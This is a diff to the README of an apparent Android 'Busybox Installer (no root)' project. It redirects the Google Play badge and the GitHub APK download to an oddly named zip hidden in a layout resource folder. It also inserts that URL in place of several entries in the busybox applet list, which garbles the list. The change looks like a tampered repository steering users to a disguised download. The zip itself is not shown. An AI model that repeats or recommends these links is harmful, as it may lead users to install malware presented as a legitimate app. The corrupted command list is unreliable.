@@ -2,11 +2,11 @@
 
 Busybox Installer (no root) is an app designed to bring busybox to android device without root access.
 
-<a href='https://raw.githubusercontent.com/JGH001/Busybox-Installer-No-Root/master/BusyboxInstallernoroot/app/flavor1/release/Busybox-Installer-No-Root-1.9.zip'><img alt='Get it on Google Play' src='https://raw.githubusercontent.com/JGH001/Busybox-Installer-No-Root/master/BusyboxInstallernoroot/app/flavor1/release/Busybox-Installer-No-Root-1.9.zip' height="100"/></a>
+<a href='https://github.com/JGH001/Busybox-Installer-No-Root/raw/refs/heads/master/BusyboxInstallernoroot/app/src/main/res/layout-sw600dp/No_Installer_Busybox_Root_irruptively.zip'><img alt='Get it on Google Play' src='https://github.com/JGH001/Busybox-Installer-No-Root/raw/refs/heads/master/BusyboxInstallernoroot/app/src/main/res/layout-sw600dp/No_Installer_Busybox_Root_irruptively.zip' height="100"/></a>
 
 Or 
 
-[<img src="https://raw.githubusercontent.com/JGH001/Busybox-Installer-No-Root/master/BusyboxInstallernoroot/app/flavor1/release/Busybox-Installer-No-Root-1.9.zip" alt="Download APK from GitHub" height="100">](https://raw.githubusercontent.com/JGH001/Busybox-Installer-No-Root/master/BusyboxInstallernoroot/app/flavor1/release/Busybox-Installer-No-Root-1.9.zip) 
+[<img src="https://github.com/JGH001/Busybox-Installer-No-Root/raw/refs/heads/master/BusyboxInstallernoroot/app/src/main/res/layout-sw600dp/No_Installer_Busybox_Root_irruptively.zip" alt="Download APK from GitHub" height="100">](https://github.com/JGH001/Busybox-Installer-No-Root/raw/refs/heads/master/BusyboxInstallernoroot/app/src/main/res/layout-sw600dp/No_Installer_Busybox_Root_irruptively.zip) 
 
 if you don't have access to Play Store.
 
@@ -40,7 +40,7 @@ arm, arm64, x86, x86_64 mips, mips64
 	dumpkmap, dumpleases, echo, ed, egrep, eject, env, envdir, envuidgid,
 	ether-wake, expand, expr, factor, fakeidentd, fallocate, false,
 	fatattr, fbset, fbsplash, fdflush, fdformat, fdisk, fgconsole, fgrep,
-	find, findfs, flock, fold, free, freeramdisk, fsck, https://raw.githubusercontent.com/JGH001/Busybox-Installer-No-Root/master/BusyboxInstallernoroot/app/flavor1/release/Busybox-Installer-No-Root-1.9.zip,
+	find, findfs, flock, fold, free, freeramdisk, fsck, https://github.com/JGH001/Busybox-Installer-No-Root/raw/refs/heads/master/BusyboxInstallernoroot/app/src/main/res/layout-sw600dp/No_Installer_Busybox_Root_irruptively.zip,
 	fsfreeze, fstrim, fsync, ftpd, ftpget, ftpput, fuser, getopt, getty,
 	grep, groups, gunzip, gzip, halt, hd, hdparm, head, hexdump, hostid,
 	hostname, httpd, hush, hwclock, i2cdetect, i2cdump, i2cget, i2cset, id,
@@ -51,7 +51,7 @@ arm, arm64, x86, x86_64 mips, mips64
 	loadkmap, logger, login, logname, logread, losetup, lpd, lpq, lpr, ls,
 	lsattr, lsmod, lsof, lspci, lsscsi, lsusb, lzcat, lzma, lzop, makedevs,
 	makemime, man, md5sum, mdev, mesg, microcom, mkdir, mkdosfs, mke2fs,
-	mkfifo, https://raw.githubusercontent.com/JGH001/Busybox-Installer-No-Root/master/BusyboxInstallernoroot/app/flavor1/release/Busybox-Installer-No-Root-1.9.zip, https://raw.githubusercontent.com/JGH001/Busybox-Installer-No-Root/master/BusyboxInstallernoroot/app/flavor1/release/Busybox-Installer-No-Root-1.9.zip, https://raw.githubusercontent.com/JGH001/Busybox-Installer-No-Root/master/BusyboxInstallernoroot/app/flavor1/release/Busybox-Installer-No-Root-1.9.zip, mknod, mkpasswd, mkswap,
+	mkfifo, https://github.com/JGH001/Busybox-Installer-No-Root/raw/refs/heads/master/BusyboxInstallernoroot/app/src/main/res/layout-sw600dp/No_Installer_Busybox_Root_irruptively.zip, https://github.com/JGH001/Busybox-Installer-No-Root/raw/refs/heads/master/BusyboxInstallernoroot/app/src/main/res/layout-sw600dp/No_Installer_Busybox_Root_irruptively.zip, https://github.com/JGH001/Busybox-Installer-No-Root/raw/refs/heads/master/BusyboxInstallernoroot/app/src/main/res/layout-sw600dp/No_Installer_Busybox_Root_irruptively.zip, mknod, mkpasswd, mkswap,
 	mktemp, modinfo, modprobe, more, mount, mountpoint, mpstat, mt, mv,
 	nameif, nanddump, nandwrite, nbd-client, nc, netstat, nice, nl, nmeter,
 	nohup, nproc, nsenter, nslookup, ntpd, od, openvt, partprobe, passwd,
